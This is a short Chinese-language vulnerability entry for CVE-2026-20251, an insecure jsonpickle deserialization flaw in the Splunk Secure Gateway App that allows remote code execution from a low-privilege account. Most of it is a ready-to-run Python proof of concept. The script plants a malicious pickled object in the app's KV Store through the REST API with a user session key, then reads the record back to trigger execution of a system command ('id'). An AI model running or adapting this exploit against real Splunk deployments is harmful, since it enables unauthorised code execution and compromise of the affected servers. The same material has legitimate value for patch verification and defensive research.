### 漏洞描述
Splunk Secure Gateway App 中存在不安全反序列化漏洞。低权限用户（无需 admin/power 角色）可通过 App Key Value Store (KV Store) 数据的 jsonpickle 反序列化实现远程代码执行。

### 漏洞原理
Splunk Secure Gateway 使用 Python 的 `jsonpickle` 库反序列化 KV Store 中的 JSON 数据。`jsonpickle` 在反序列化时会重建任意 Python 对象，攻击者可构造恶意 JSON payload 执行任意代码。

### POC/利用
```python
# CVE-2026-20251 PoC - Splunk Secure Gateway jsonpickle RCE
# 需要低权限用户认证
# 通过 KV Store 注入恶意 jsonpickle payload

import requests
import jsonpickle
import json

TARGET = "https://splunk-server:8089"
SESSION_KEY = "YOUR_SESSION_KEY"  # 低权限用户 session

# 构造恶意 jsonpickle payload — 执行系统命令
class RCE:
    def __reduce__(self):
        import subprocess
        return (subprocess.check_output, (["id"],))

malicious_data = jsonpickle.encode(RCE())

# 通过 KV Store API 注入
headers = {
    "Authorization": f"Splunk {SESSION_KEY}",
    "Content-Type": "application/json"
}

# 写入恶意 KV Store 数据
r = requests.post(
    f"{TARGET}/servicesNS/nobody/splunk_secure_gateway/storage/collections/data/ssg_kv_store",
    headers=headers,
    json={"_key": "evil", "data": malicious_data},
    verify=False
)
print(f"[*] Injected payload: {r.status_code}")

# 触发反序列化 — 读取 KV Store
r2 = requests.get(
    f"{TARGET}/servicesNS/nobody/splunk_secure_gateway/storage/collections/data/ssg_kv_store/evil",
    headers=headers,
    verify=False
)
print(f"[+] Result: {r2.text}")
```
